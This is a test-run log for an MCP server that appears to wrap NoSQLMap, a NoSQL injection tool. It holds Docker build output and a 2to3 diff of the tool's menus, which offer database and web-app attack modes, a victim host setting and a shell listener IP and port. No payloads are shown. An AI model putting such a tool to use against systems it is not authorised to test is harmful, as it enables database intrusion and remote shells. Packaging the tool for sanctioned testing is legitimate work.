@@ -1,0 +1,2995 @@
+MCP test run - nosqlmap-mcp
+Generated (UTC): 2026-03-20T18:56:46Z
+Exit code: 0
+Note: Full stdout/stderr capture (this test.sh does not use the structured test-results writer).
+---------------------------------------------------------------------------------
+=================================================================================
+[0;34mNoSQLMap MCP Server — Test Suite[0m
+=================================================================================
+
+[0;34m[Test 1] Docker image[0m
+  Image not found. Building...
+#0 building with "desktop-linux" instance using docker driver
+
+#1 [internal] load build definition from Dockerfile
+#1 transferring dockerfile: 2.21kB done
+#1 DONE 0.0s
+
+#2 [internal] load metadata for docker.io/library/python:3.12-slim-bookworm
+#2 DONE 0.4s
+
+#3 [internal] load .dockerignore
+#3 transferring context: 2B done
+#3 DONE 0.0s
+
+#4 [ 1/10] FROM docker.io/library/python:3.12-slim-bookworm@sha256:31c0807da611e2e377a2e9b566ad4eb038ac5a5838cbbbe6f2262259b5dc77a0
+#4 resolve docker.io/library/python:3.12-slim-bookworm@sha256:31c0807da611e2e377a2e9b566ad4eb038ac5a5838cbbbe6f2262259b5dc77a0 done
+#4 DONE 0.0s
+
+#5 [ 2/10] RUN groupadd -g 1000 mcpuser &&     useradd -u 1000 -g mcpuser -m -s /bin/bash mcpuser
+#5 CACHED
+
+#6 [internal] preparing inline document
+#6 DONE 0.0s
+
+#7 [internal] load build context
+#7 transferring context: 4.66kB done
+#7 DONE 0.0s
+
+#8 [ 3/10] RUN apt-get update && apt-get install -y --no-install-recommends     tini     git     ca-certificates     && rm -rf /var/lib/apt/lists/*     && git clone --depth 1 https://github.com/codingo/NoSQLMap.git /opt/NoSQLMap     && 2to3 -w -n /opt/NoSQLMap/*.py 2>/dev/null || true     && sed -i 's/\.database_names()/.list_database_names()/g' /opt/NoSQLMap/*.py     && sed -i 's/\.collection_names()/.list_collection_names()/g' /opt/NoSQLMap/*.py     && sed -i "s/except NoSQLMapException, e:/except NoSQLMapException as e:/g" /opt/NoSQLMap/*.py     && pip install --no-cache-dir         'pymongo>=3.7,<5.0'         'httplib2>=0.19.0'         'ipcalc>=1.1.3'         'pbkdf2>=1.3'         'requests'         'CouchDB>=1.1'         'six'
+#8 0.147 Get:1 http://deb.debian.org/debian bookworm InRelease [151 kB]
+#8 0.185 Get:2 http://deb.debian.org/debian bookworm-updates InRelease [55.4 kB]
+#8 0.314 Get:3 http://deb.debian.org/debian-security bookworm-security InRelease [48.0 kB]
+#8 0.321 Get:4 http://deb.debian.org/debian bookworm/main arm64 Packages [8691 kB]
+#8 0.904 Get:5 http://deb.debian.org/debian bookworm-updates/main arm64 Packages [6936 B]
+#8 0.910 Get:6 http://deb.debian.org/debian-security bookworm-security/main arm64 Packages [291 kB]
+#8 1.550 Fetched 9243 kB in 1s (6475 kB/s)
+#8 1.550 Reading package lists...
+#8 1.804 Reading package lists...
+#8 2.051 Building dependency tree...
+#8 2.108 Reading state information...
+#8 2.177 ca-certificates is already the newest version (20230311+deb12u1).
+#8 2.177 The following additional packages will be installed:
+#8 2.177   git-man libbrotli1 libcurl3-gnutls liberror-perl libexpat1 libgdbm-compat4
+#8 2.178   libldap-2.5-0 libnghttp2-14 libperl5.36 libpsl5 librtmp1 libsasl2-2
+#8 2.178   libsasl2-modules-db libssh2-1 perl perl-modules-5.36
+#8 2.178 Suggested packages:
+#8 2.178   gettext-base git-daemon-run | git-daemon-sysvinit git-doc git-email git-gui
+#8 2.178   gitk gitweb git-cvs git-mediawiki git-svn sensible-utils perl-doc
+#8 2.178   libterm-readline-gnu-perl | libterm-readline-perl-perl make
+#8 2.178   libtap-harness-archive-perl
+#8 2.178 Recommended packages:
+#8 2.178   patch less ssh-client libldap-common publicsuffix libsasl2-modules
+#8 2.267 The following NEW packages will be installed:
+#8 2.267   git git-man libbrotli1 libcurl3-gnutls liberror-perl libexpat1
+#8 2.267   libgdbm-compat4 libldap-2.5-0 libnghttp2-14 libperl5.36 libpsl5 librtmp1
+#8 2.267   libsasl2-2 libsasl2-modules-db libssh2-1 perl perl-modules-5.36 tini
+#8 2.308 0 upgraded, 18 newly installed, 0 to remove and 0 not upgraded.
+#8 2.308 Need to get 17.9 MB of archives.
+#8 2.308 After this operation, 104 MB of additional disk space will be used.
+#8 2.308 Get:1 http://deb.debian.org/debian bookworm/main arm64 perl-modules-5.36 all 5.36.0-7+deb12u3 [2815 kB]
+#8 2.446 Get:2 http://deb.debian.org/debian bookworm/main arm64 libgdbm-compat4 arm64 1.23-3 [48.0 kB]
+#8 2.447 Get:3 http://deb.debian.org/debian bookworm/main arm64 libperl5.36 arm64 5.36.0-7+deb12u3 [4009 kB]
+#8 2.761 Get:4 http://deb.debian.org/debian bookworm/main arm64 perl arm64 5.36.0-7+deb12u3 [239 kB]
+#8 2.769 Get:5 http://deb.debian.org/debian bookworm/main arm64 libbrotli1 arm64 1.0.9-2+b6 [269 kB]
+#8 2.871 Get:6 http://deb.debian.org/debian bookworm/main arm64 libsasl2-modules-db arm64 2.1.28+dfsg-10 [20.8 kB]
+#8 2.871 Get:7 http://deb.debian.org/debian bookworm/main arm64 libsasl2-2 arm64 2.1.28+dfsg-10 [58.0 kB]
+#8 2.871 Get:8 http://deb.debian.org/debian bookworm/main arm64 libldap-2.5-0 arm64 2.5.13+dfsg-5 [171 kB]
+#8 2.874 Get:9 http://deb.debian.org/debian bookworm/main arm64 libnghttp2-14 arm64 1.52.0-1+deb12u2 [68.6 kB]
+#8 2.874 Get:10 http://deb.debian.org/debian bookworm/main arm64 libpsl5 arm64 0.21.2-1 [58.6 kB]
+#8 2.875 Get:11 http://deb.debian.org/debian bookworm/main arm64 librtmp1 arm64 2.4+20151223.gitfa8646d.1-2+b2 [59.4 kB]
+#8 2.875 Get:12 http://deb.debian.org/debian bookworm/main arm64 libssh2-1 arm64 1.10.0-3+b1 [172 kB]
+#8 2.877 Get:13 http://deb.debian.org/debian bookworm/main arm64 libcurl3-gnutls arm64 7.88.1-10+deb12u14 [362 kB]
+#8 2.880 Get:14 http://deb.debian.org/debian bookworm/main arm64 libexpat1 arm64 2.5.0-1+deb12u2 [86.3 kB]
+#8 2.883 Get:15 http://deb.debian.org/debian bookworm/main arm64 liberror-perl all 0.17029-2 [29.0 kB]
+#8 2.883 Get:16 http://deb.debian.org/debian bookworm/main arm64 git-man all 1:2.39.5-0+deb12u3 [2053 kB]
+#8 3.029 Get:17 http://deb.debian.org/debian bookworm/main arm64 git arm64 1:2.39.5-0+deb12u3 [7153 kB]
+#8 3.582 Get:18 http://deb.debian.org/debian bookworm/main arm64 tini arm64 0.19.0-1+b3 [224 kB]
+#8 3.680 debconf: delaying package configuration, since apt-utils is not installed
+#8 3.691 Fetched 17.9 MB in 1s (13.5 MB/s)
+#8 3.700 Selecting previously unselected package perl-modules-5.36.
+#8 3.700 (Reading database ... (Reading database ... 5%(Reading database ... 10%(Reading database ... 15%(Reading database ... 20%(Reading database ... 25%(Reading database ... 30%(Reading database ... 35%(Reading database ... 40%(Reading database ... 45%(Reading database ... 50%(Reading database ... 55%(Reading database ... 60%(Reading database ... 65%(Reading database ... 70%(Reading database ... 75%(Reading database ... 80%(Reading database ... 85%(Reading database ... 90%(Reading database ... 95%(Reading database ... 100%(Reading database ... 6689 files and directories currently installed.)
+#8 3.708 Preparing to unpack .../00-perl-modules-5.36_5.36.0-7+deb12u3_all.deb ...
+#8 3.710 Unpacking perl-modules-5.36 (5.36.0-7+deb12u3) ...
+#8 3.891 Selecting previously unselected package libgdbm-compat4:arm64.
+#8 3.892 Preparing to unpack .../01-libgdbm-compat4_1.23-3_arm64.deb ...
+#8 3.896 Unpacking libgdbm-compat4:arm64 (1.23-3) ...
+#8 3.909 Selecting previously unselected package libperl5.36:arm64.
+#8 3.909 Preparing to unpack .../02-libperl5.36_5.36.0-7+deb12u3_arm64.deb ...
+#8 3.910 Unpacking libperl5.36:arm64 (5.36.0-7+deb12u3) ...
+#8 4.134 Selecting previously unselected package perl.
+#8 4.135 Preparing to unpack .../03-perl_5.36.0-7+deb12u3_arm64.deb ...
+#8 4.140 Unpacking perl (5.36.0-7+deb12u3) ...
+#8 4.162 Selecting previously unselected package libbrotli1:arm64.
+#8 4.162 Preparing to unpack .../04-libbrotli1_1.0.9-2+b6_arm64.deb ...
+#8 4.163 Unpacking libbrotli1:arm64 (1.0.9-2+b6) ...
+#8 4.185 Selecting previously unselected package libsasl2-modules-db:arm64.
+#8 4.186 Preparing to unpack .../05-libsasl2-modules-db_2.1.28+dfsg-10_arm64.deb ...
+#8 4.187 Unpacking libsasl2-modules-db:arm64 (2.1.28+dfsg-10) ...
+#8 4.197 Selecting previously unselected package libsasl2-2:arm64.
+#8 4.198 Preparing to unpack .../06-libsasl2-2_2.1.28+dfsg-10_arm64.deb ...
+#8 4.199 Unpacking libsasl2-2:arm64 (2.1.28+dfsg-10) ...
+#8 4.213 Selecting previously unselected package libldap-2.5-0:arm64.
+#8 4.214 Preparing to unpack .../07-libldap-2.5-0_2.5.13+dfsg-5_arm64.deb ...
+#8 4.215 Unpacking libldap-2.5-0:arm64 (2.5.13+dfsg-5) ...
+#8 4.232 Selecting previously unselected package libnghttp2-14:arm64.
+#8 4.233 Preparing to unpack .../08-libnghttp2-14_1.52.0-1+deb12u2_arm64.deb ...
+#8 4.234 Unpacking libnghttp2-14:arm64 (1.52.0-1+deb12u2) ...
+#8 4.248 Selecting previously unselected package libpsl5:arm64.
+#8 4.248 Preparing to unpack .../09-libpsl5_0.21.2-1_arm64.deb ...
+#8 4.251 Unpacking libpsl5:arm64 (0.21.2-1) ...
+#8 4.265 Selecting previously unselected package librtmp1:arm64.
+#8 4.265 Preparing to unpack .../10-librtmp1_2.4+20151223.gitfa8646d.1-2+b2_arm64.deb ...
+#8 4.266 Unpacking librtmp1:arm64 (2.4+20151223.gitfa8646d.1-2+b2) ...
+#8 4.278 Selecting previously unselected package libssh2-1:arm64.
+#8 4.279 Preparing to unpack .../11-libssh2-1_1.10.0-3+b1_arm64.deb ...
+#8 4.281 Unpacking libssh2-1:arm64 (1.10.0-3+b1) ...
+#8 4.298 Selecting previously unselected package libcurl3-gnutls:arm64.
+#8 4.299 Preparing to unpack .../12-libcurl3-gnutls_7.88.1-10+deb12u14_arm64.deb ...
+#8 4.300 Unpacking libcurl3-gnutls:arm64 (7.88.1-10+deb12u14) ...
+#8 4.324 Selecting previously unselected package libexpat1:arm64.
+#8 4.326 Preparing to unpack .../13-libexpat1_2.5.0-1+deb12u2_arm64.deb ...
+#8 4.327 Unpacking libexpat1:arm64 (2.5.0-1+deb12u2) ...
+#8 4.340 Selecting previously unselected package liberror-perl.
+#8 4.341 Preparing to unpack .../14-liberror-perl_0.17029-2_all.deb ...
+#8 4.341 Unpacking liberror-perl (0.17029-2) ...
+#8 4.352 Selecting previously unselected package git-man.
+#8 4.353 Preparing to unpack .../15-git-man_1%3a2.39.5-0+deb12u3_all.deb ...
+#8 4.354 Unpacking git-man (1:2.39.5-0+deb12u3) ...
+#8 4.421 Selecting previously unselected package git.
+#8 4.422 Preparing to unpack .../16-git_1%3a2.39.5-0+deb12u3_arm64.deb ...
+#8 4.425 Unpacking git (1:2.39.5-0+deb12u3) ...
+#8 4.651 Selecting previously unselected package tini.
+#8 4.651 Preparing to unpack .../17-tini_0.19.0-1+b3_arm64.deb ...
+#8 4.652 Unpacking tini (0.19.0-1+b3) ...
+#8 4.676 Setting up libexpat1:arm64 (2.5.0-1+deb12u2) ...
+#8 4.680 Setting up libpsl5:arm64 (0.21.2-1) ...
+#8 4.682 Setting up libbrotli1:arm64 (1.0.9-2+b6) ...
+#8 4.687 Setting up libnghttp2-14:arm64 (1.52.0-1+deb12u2) ...
+#8 4.690 Setting up libsasl2-modules-db:arm64 (2.1.28+dfsg-10) ...
+#8 4.693 Setting up perl-modules-5.36 (5.36.0-7+deb12u3) ...
+#8 4.697 Setting up librtmp1:arm64 (2.4+20151223.gitfa8646d.1-2+b2) ...
+#8 4.700 Setting up tini (0.19.0-1+b3) ...
+#8 4.704 Setting up libgdbm-compat4:arm64 (1.23-3) ...
+#8 4.706 Setting up libsasl2-2:arm64 (2.1.28+dfsg-10) ...
+#8 4.711 Setting up git-man (1:2.39.5-0+deb12u3) ...
+#8 4.714 Setting up libssh2-1:arm64 (1.10.0-3+b1) ...
+#8 4.718 Setting up libperl5.36:arm64 (5.36.0-7+deb12u3) ...
+#8 4.721 Setting up libldap-2.5-0:arm64 (2.5.13+dfsg-5) ...
+#8 4.725 Setting up perl (5.36.0-7+deb12u3) ...
+#8 4.731 Setting up libcurl3-gnutls:arm64 (7.88.1-10+deb12u14) ...
+#8 4.734 Setting up liberror-perl (0.17029-2) ...
+#8 4.738 Setting up git (1:2.39.5-0+deb12u3) ...
+#8 4.745 Processing triggers for libc-bin (2.36-9+deb12u13) ...
+#8 4.774 Cloning into '/opt/NoSQLMap'...
+#8 6.375 --- /opt/NoSQLMap/nosqlmap.py	(original)
+#8 6.375 +++ /opt/NoSQLMap/nosqlmap.py	(refactored)
+#8 6.375 @@ -62,20 +62,20 @@
+#8 6.375      mmSelect = True
+#8 6.375      while mmSelect:
+#8 6.375          os.system('clear')
+#8 6.375 -        print " _  _     ___  ___  _    __  __           "
+#8 6.375 -        print "| \| |___/ __|/ _ \| |  |  \/  |__ _ _ __ "
+#8 6.375 -        print "| .` / _ \__ \ (_) | |__| |\/| / _` | '_ \\"
+#8 6.375 +        print(" _  _     ___  ___  _    __  __           ")
+#8 6.375 +        print("| \| |___/ __|/ _ \| |  |  \/  |__ _ _ __ ")
+#8 6.375 +        print("| .` / _ \__ \ (_) | |__| |\/| / _` | '_ \\")
+#8 6.375          print("|_|\_\___/___/\__\_\____|_|  |_\__,_| .__/")
+#8 6.375          print(" v0.7 codingo@protonmail.com        |_|   ")
+#8 6.375 -        print "\n"
+#8 6.375 -        print "1-Set options"
+#8 6.375 -        print "2-NoSQL DB Access Attacks"
+#8 6.375 -        print "3-NoSQL Web App attacks"
+#8 6.375 -        print "4-Scan for Anonymous " + platform + " Access"
+#8 6.375 -        print "5-Change Platform (Current: " + platform + ")"
+#8 6.375 -        print "x-Exit"
+#8 6.375 -
+#8 6.375 -        select = raw_input("Select an option: ")
+#8 6.375 +        print("\n")
+#8 6.375 +        print("1-Set options")
+#8 6.375 +        print("2-NoSQL DB Access Attacks")
+#8 6.375 +        print("3-NoSQL Web App attacks")
+#8 6.375 +        print("4-Scan for Anonymous " + platform + " Access")
+#8 6.375 +        print("5-Change Platform (Current: " + platform + ")")
+#8 6.375 +        print("x-Exit")
+#8 6.375 +
+#8 6.375 +        select = input("Select an option: ")
+#8 6.375  
+#8 6.375          if select == "1":
+#8 6.375              options()
+#8 6.375 @@ -90,7 +90,7 @@
+#8 6.375  
+#8 6.375              # Check minimum required options
+#8 6.375              else:
+#8 6.375 -                raw_input("Target not set! Check options.  Press enter to continue...")
+#8 6.375 +                input("Target not set! Check options.  Press enter to continue...")
+#8 6.375  
+#8 6.375  
+#8 6.375          elif select == "3":
+#8 6.375 @@ -103,7 +103,7 @@
+#8 6.375                      nsmweb.postApps(victim,webPort,uri,https,verb,postData,requestHeaders)
+#8 6.375  
+#8 6.375              else:
+#8 6.375 -                raw_input("Options not set! Check host and URI path.  Press enter to continue...")
+#8 6.375 +                input("Options not set! Check host and URI path.  Press enter to continue...")
+#8 6.375  
+#8 6.375  
+#8 6.375          elif select == "4":
+#8 6.375 @@ -120,21 +120,21 @@
+#8 6.375              sys.exit()
+#8 6.375  
+#8 6.375          else:
+#8 6.375 -            raw_input("Invalid selection.  Press enter to continue.")
+#8 6.375 +            input("Invalid selection.  Press enter to continue.")
+#8 6.375  
+#8 6.375  def build_request_headers(reqHeadersIn):
+#8 6.375      requestHeaders = {}
+#8 6.375      reqHeadersArray = reqHeadersIn.split(",")
+#8 6.375      headerNames = reqHeadersArray[0::2]
+#8 6.375      headerValues = reqHeadersArray[1::2]
+#8 6.375 -    requestHeaders = dict(zip(headerNames, headerValues))
+#8 6.375 +    requestHeaders = dict(list(zip(headerNames, headerValues)))
+#8 6.375      return requestHeaders
+#8 6.375  
+#8 6.375  def build_post_data(postDataIn):
+#8 6.375      pdArray = postDataIn.split(",")
+#8 6.375      paramNames = pdArray[0::2]
+#8 6.375      paramValues = pdArray[1::2]
+#8 6.375 -    postData = dict(zip(paramNames,paramValues))
+#8 6.375 +    postData = dict(list(zip(paramNames,paramValues)))
+#8 6.375      return postData
+#8 6.375  
+#8 6.375  def attack(args):
+#8 6.375 @@ -171,12 +171,12 @@
+#8 6.375      global platform
+#8 6.375      global dbPort
+#8 6.375      select = True
+#8 6.375 -    print "\n"
+#8 6.375 +    print("\n")
+#8 6.375  
+#8 6.375      while select:
+#8 6.375 -        print "1-MongoDB"
+#8 6.375 -        print "2-CouchDB"
+#8 6.375 -        pSel = raw_input("Select a platform: ")
+#8 6.375 +        print("1-MongoDB")
+#8 6.375 +        print("2-CouchDB")
+#8 6.375 +        pSel = input("Select a platform: ")
+#8 6.375  
+#8 6.375          if pSel == "1":
+#8 6.375              platform = "MongoDB"
+#8 6.375 @@ -188,7 +188,7 @@
+#8 6.375              dbPort = 5984
+#8 6.375              return
+#8 6.375          else:
+#8 6.375 -            raw_input("Invalid selection.  Press enter to continue.")
+#8 6.375 +            input("Invalid selection.  Press enter to continue.")
+#8 6.375  
+#8 6.375  
+#8 6.375  def options():
+#8 6.375 @@ -236,24 +236,24 @@
+#8 6.375          optSelect = True
+#8 6.375  
+#8 6.375      while optSelect:
+#8 6.375 -        print "\n\n"
+#8 6.375 -        print "Options"
+#8 6.375 -        print "1-Set target host/IP (Current: " + str(victim) + ")"
+#8 6.375 -        print "2-Set web app port (Current: " + str(webPort) + ")"
+#8 6.375 -        print "3-Set App Path (Current: " + str(uri) + ")"
+#8 6.375 -        print "4-Toggle HTTPS (Current: " + str(https) + ")"
+#8 6.375 -        print "5-Set " + platform + " Port (Current : " + str(dbPort) + ")"
+#8 6.375 -        print "6-Set HTTP Request Method (GET/POST) (Current: " + httpMethod + ")"
+#8 6.375 -        print "7-Set my local " +  platform + "/Shell IP (Current: " + str(myIP) + ")"
+#8 6.375 -        print "8-Set shell listener port (Current: " + str(myPort) + ")"
+#8 6.375 -        print "9-Toggle Verbose Mode: (Current: " + str(verb) + ")"
+#8 6.375 -        print "0-Load options file"
+#8 6.375 -        print "a-Load options from saved Burp request"
+#8 6.375 -        print "b-Save options file"
+#8 6.375 -        print "h-Set headers"
+#8 6.375 -        print "x-Back to main menu"
+#8 6.375 -
+#8 6.375 -        select = raw_input("Select an option: ")
+#8 6.375 +        print("\n\n")
+#8 6.375 +        print("Options")
+#8 6.375 +        print("1-Set target host/IP (Current: " + str(victim) + ")")
+#8 6.375 +        print("2-Set web app port (Current: " + str(webPort) + ")")
+#8 6.375 +        print("3-Set App Path (Current: " + str(uri) + ")")
+#8 6.375 +        print("4-Toggle HTTPS (Current: " + str(https) + ")")
+#8 6.375 +        print("5-Set " + platform + " Port (Current : " + str(dbPort) + ")")
+#8 6.375 +        print("6-Set HTTP Request Method (GET/POST) (Current: " + httpMethod + ")")
+#8 6.375 +        print("7-Set my local " +  platform + "/Shell IP (Current: " + str(myIP) + ")")
+#8 6.375 +        print("8-Set shell listener port (Current: " + str(myPort) + ")")
+#8 6.375 +        print("9-Toggle Verbose Mode: (Current: " + str(verb) + ")")
+#8 6.375 +        print("0-Load options file")
+#8 6.375 +        print("a-Load options from saved Burp request")
+#8 6.375 +        print("b-Save options file")
+#8 6.375 +        print("h-Set headers")
+#8 6.375 +        print("x-Back to main menu")
+#8 6.375 +
+#8 6.375 +        select = input("Select an option: ")
+#8 6.375  
+#8 6.375          if select == "1":
+#8 6.375              # Unset the boolean if it's set since we're setting it again.
+#8 6.375 @@ -263,7 +263,7 @@
+#8 6.375              while optionSet[0] == False:
+#8 6.375                  goodDigits = True
+#8 6.375                  notDNS = True
+#8 6.375 -                victim = raw_input("Enter the host IP/DNS name: ")
+#8 6.375 +                victim = input("Enter the host IP/DNS name: ")
+#8 6.375                  # make sure we got a valid IP
+#8 6.375                  octets = victim.split(".")
+#8 6.375  
+#8 6.375 @@ -277,7 +277,7 @@
+#8 6.375                      for item in octets:
+#8 6.375                          try:
+#8 6.375                              if int(item) < 0 or int(item) > 255:
+#8 6.375 -                                print "Bad octet in IP address."
+#8 6.375 +                                print("Bad octet in IP address.")
+#8 6.375                                  goodDigits = False
+#8 6.375  
+#8 6.375                          except NoSQLMapException("[!] Must be a DNS name."):
+#8 6.375 @@ -287,67 +287,67 @@
+#8 6.375  
+#8 6.375                  #If everything checks out set the IP and break the loop
+#8 6.375                  if goodDigits == True or notDNS == False:
+#8 6.375 -                    print "\nTarget set to " + victim + "\n"
+#8 6.375 +                    print("\nTarget set to " + victim + "\n")
+#8 6.375                      optionSet[0] = True
+#8 6.375  
+#8 6.375          elif select == "2":
+#8 6.375 -            webPort = raw_input("Enter the HTTP port for web apps: ")
+#8 6.375 -            print "\nHTTP port set to " + webPort + "\n"
+#8 6.375 +            webPort = input("Enter the HTTP port for web apps: ")
+#8 6.375 +            print("\nHTTP port set to " + webPort + "\n")
+#8 6.375              optionSet[1] = True
+#8 6.375  
+#8 6.375          elif select == "3":
+#8 6.375 -            uri = raw_input("Enter URI Path (Press enter for no URI): ")
+#8 6.375 +            uri = input("Enter URI Path (Press enter for no URI): ")
+#8 6.375              #Ensuring the URI path always starts with / and accepts null values
+#8 6.375              if len(uri) == 0:
+#8 6.375                  uri = "Not Set"
+#8 6.375 -                print "\nURI Not Set." "\n"
+#8 6.375 +                print("\nURI Not Set." "\n")
+#8 6.375                  optionSet[2] = False
+#8 6.375  
+#8 6.375              elif uri[0] != "/":
+#8 6.375                  uri = "/" + uri
+#8 6.375 -                print "\nURI Path set to " + uri + "\n"
+#8 6.375 +                print("\nURI Path set to " + uri + "\n")
+#8 6.375              optionSet[2] = True
+#8 6.375  
+#8 6.375          elif select == "4":
+#8 6.375              if https == "OFF":
+#8 6.375 -                print "HTTPS enabled."
+#8 6.375 +                print("HTTPS enabled.")
+#8 6.375                  https = "ON"
+#8 6.375                  optionSet[8] = True
+#8 6.375  
+#8 6.375              elif https == "ON":
+#8 6.375 -                print "HTTPS disabled."
+#8 6.375 +                print("HTTPS disabled.")
+#8 6.375                  https = "OFF"
+#8 6.375                  optionSet[8] = True
+#8 6.375  
+#8 6.375  
+#8 6.375          elif select == "5":
+#8 6.375 -            dbPort = int(raw_input("Enter target MongoDB port: "))
+#8 6.375 -            print "\nTarget Mongo Port set to " + str(dbPort) + "\n"
+#8 6.399 +            dbPort = int(input("Enter target MongoDB port: "))
+#8 6.399 +            print("\nTarget Mongo Port set to " + str(dbPort) + "\n")
+#8 6.399              optionSet[7] = True
+#8 6.399  
+#8 6.399          elif select == "6":
+#8 6.399              httpMethod = True
+#8 6.399              while httpMethod == True:
+#8 6.399  
+#8 6.399 -                print "1-Send request as a GET"
+#8 6.399 -                print "2-Send request as a POST"
+#8 6.399 -                httpMethod = raw_input("Select an option: ")
+#8 6.399 +                print("1-Send request as a GET")
+#8 6.399 +                print("2-Send request as a POST")
+#8 6.399 +                httpMethod = input("Select an option: ")
+#8 6.399  
+#8 6.399                  if httpMethod == "1":
+#8 6.399                      httpMethod = "GET"
+#8 6.399 -                    print "GET request set"
+#8 6.399 +                    print("GET request set")
+#8 6.399                      requestHeaders = {}
+#8 6.399                      optionSet[3] = True
+#8 6.399  
+#8 6.399                  elif httpMethod == "2":
+#8 6.399 -                    print "POST request set"
+#8 6.399 +                    print("POST request set")
+#8 6.399                      optionSet[3] = True
+#8 6.399 -                    postDataIn = raw_input("Enter POST data in a comma separated list (i.e. param name 1,value1,param name 2,value2)\n")
+#8 6.399 +                    postDataIn = input("Enter POST data in a comma separated list (i.e. param name 1,value1,param name 2,value2)\n")
+#8 6.399                      postData = build_post_data(postDataIn)
+#8 6.399                      httpMethod = "POST"
+#8 6.399  
+#8 6.399                  else:
+#8 6.399 -                    print "Invalid selection"
+#8 6.399 +                    print("Invalid selection")
+#8 6.399  
+#8 6.399          elif select == "7":
+#8 6.399              # Unset the setting boolean since we're setting it again.
+#8 6.399 @@ -359,12 +359,12 @@
+#8 6.399                  # Every time when user input Invalid IP, goodLen and goodDigits should be reset. If this is not done, there will be a bug
+#8 6.399                  # For example enter 10.0.0.1234 first and the goodLen will be set to True and goodDigits will be set to False
+#8 6.399                  # Second step enter 10.0.123, because goodLen has already been set to True, this invalid IP will be put in myIP variables
+#8 6.399 -                myIP = raw_input("Enter the host IP for my " + platform +"/Shells: ")
+#8 6.399 +                myIP = input("Enter the host IP for my " + platform +"/Shells: ")
+#8 6.399                  # make sure we got a valid IP
+#8 6.399                  octets = myIP.split(".")
+#8 6.399                  # If there aren't 4 octets, toss an error.
+#8 6.399                  if len(octets) != 4:
+#8 6.399 -                    print "Invalid IP length."
+#8 6.399 +                    print("Invalid IP length.")
+#8 6.399  
+#8 6.399                  else:
+#8 6.399                      goodLen = True
+#8 6.399 @@ -373,7 +373,7 @@
+#8 6.399                  # If the format of the IP is good, check and make sure the octets are all within acceptable ranges.
+#8 6.399                      for item in octets:
+#8 6.399                          if int(item) < 0 or int(item) > 255:
+#8 6.399 -                            print "Bad octet in IP address."
+#8 6.399 +                            print("Bad octet in IP address.")
+#8 6.399                              goodDigits = False
+#8 6.399  
+#8 6.399                          # else:
+#8 6.399 @@ -385,35 +385,35 @@
+#8 6.399  
+#8 6.399                  # If everything checks out set the IP and break the loop
+#8 6.399                  if goodLen == True and goodDigits == True:
+#8 6.399 -                    print "\nShell/DB listener set to " + myIP + "\n"
+#8 6.399 +                    print("\nShell/DB listener set to " + myIP + "\n")
+#8 6.399                      optionSet[4] = True
+#8 6.399  
+#8 6.399          elif select == "8":
+#8 6.399 -            myPort = raw_input("Enter TCP listener for shells: ")
+#8 6.399 -            print "Shell TCP listener set to " + myPort + "\n"
+#8 6.399 +            myPort = input("Enter TCP listener for shells: ")
+#8 6.399 +            print("Shell TCP listener set to " + myPort + "\n")
+#8 6.399              optionSet[5] = True
+#8 6.399  
+#8 6.399          elif select == "9":
+#8 6.399              if verb == "OFF":
+#8 6.399 -                print "Verbose output enabled."
+#8 6.399 +                print("Verbose output enabled.")
+#8 6.399                  verb = "ON"
+#8 6.399                  optionSet[6] = True
+#8 6.399  
+#8 6.399              elif verb == "ON":
+#8 6.399 -                print "Verbose output disabled."
+#8 6.399 +                print("Verbose output disabled.")
+#8 6.399                  verb = "OFF"
+#8 6.399                  optionSet[6] = True
+#8 6.399  
+#8 6.399          elif select == "0":
+#8 6.399 -            loadPath = raw_input("Enter file name to load: ")
+#8 6.399 +            loadPath = input("Enter file name to load: ")
+#8 6.399              csvOpt = []
+#8 6.399              try:
+#8 6.399                  with open(loadPath,"r") as fo:
+#8 6.399                      for line in fo:
+#8 6.399                          csvOpt.append(line.rstrip())
+#8 6.399              except IOError as e:
+#8 6.399 -                print "I/O error({0}): {1}".format(e.errno, e.strerror)
+#8 6.399 -                raw_input("error reading file.  Press enter to continue...")
+#8 6.399 +                print("I/O error({0}): {1}".format(e.errno, e.strerror))
+#8 6.399 +                input("error reading file.  Press enter to continue...")
+#8 6.399                  return
+#8 6.399  
+#8 6.399              optList = csvOpt[0].split(",")
+#8 6.399 @@ -443,15 +443,15 @@
+#8 6.399                  x += 1
+#8 6.399  
+#8 6.399          elif select == "a":
+#8 6.399 -            loadPath = raw_input("Enter path to Burp request file: ")
+#8 6.399 +            loadPath = input("Enter path to Burp request file: ")
+#8 6.399              reqData = []
+#8 6.399              try:
+#8 6.399                  with open(loadPath,"r") as fo:
+#8 6.399                      for line in fo:
+#8 6.399                          reqData.append(line.rstrip())
+#8 6.399              except IOError as e:
+#8 6.399 -                print "I/O error({0}): {1}".format(e.errno, e.strerror)
+#8 6.399 -                raw_input("error reading file.  Press enter to continue...")
+#8 6.399 +                print("I/O error({0}): {1}".format(e.errno, e.strerror))
+#8 6.399 +                input("error reading file.  Press enter to continue...")
+#8 6.399                  return
+#8 6.399  
+#8 6.399              methodPath = reqData[0].split(" ")
+#8 6.399 @@ -472,10 +472,10 @@
+#8 6.399                      paramNames.append(tempList[0])
+#8 6.399                      paramValues.append(tempList[1])
+#8 6.399  
+#8 6.399 -                postData = dict(zip(paramNames,paramValues))
+#8 6.399 +                postData = dict(list(zip(paramNames,paramValues)))
+#8 6.399  
+#8 6.399              else:
+#8 6.399 -                print "unsupported method in request header."
+#8 6.399 +                print("unsupported method in request header.")
+#8 6.399  
+#8 6.399              # load the HTTP headers
+#8 6.399              for line in reqData[1:]:
+#8 6.399 @@ -490,7 +490,7 @@
+#8 6.399              optionSet[2] = True
+#8 6.399  
+#8 6.399          elif select == "b":
+#8 6.399 -            savePath = raw_input("Enter file name to save: ")
+#8 6.399 +            savePath = input("Enter file name to save: ")
+#8 6.399              try:
+#8 6.399                  with open(savePath, "wb") as fo:
+#8 6.399                      fo.write(str(victim) + "," + str(webPort) + "," + str(uri) + "," + str(httpMethod) + "," + str(myIP) + "," + str(myPort) + "," + verb + "," + https)
+#8 6.399 @@ -498,12 +498,12 @@
+#8 6.399                      if httpMethod == "POST":
+#8 6.399                          fo.write(",\n"+ str(postData))
+#8 6.399                      fo.write(",\n" + str(requestHeaders) )
+#8 6.399 -                    print "Options file saved!"
+#8 6.399 +                    print("Options file saved!")
+#8 6.399              except IOError:
+#8 6.399 -                print "Couldn't save options file."
+#8 6.399 +                print("Couldn't save options file.")
+#8 6.399  
+#8 6.399          elif select == "h":
+#8 6.399 -            reqHeadersIn = raw_input("Enter HTTP Request Header data in a comma separated list (i.e. header name 1,value1,header name 2,value2)\n")
+#8 6.399 +            reqHeadersIn = input("Enter HTTP Request Header data in a comma separated list (i.e. header name 1,value1,header name 2,value2)\n")
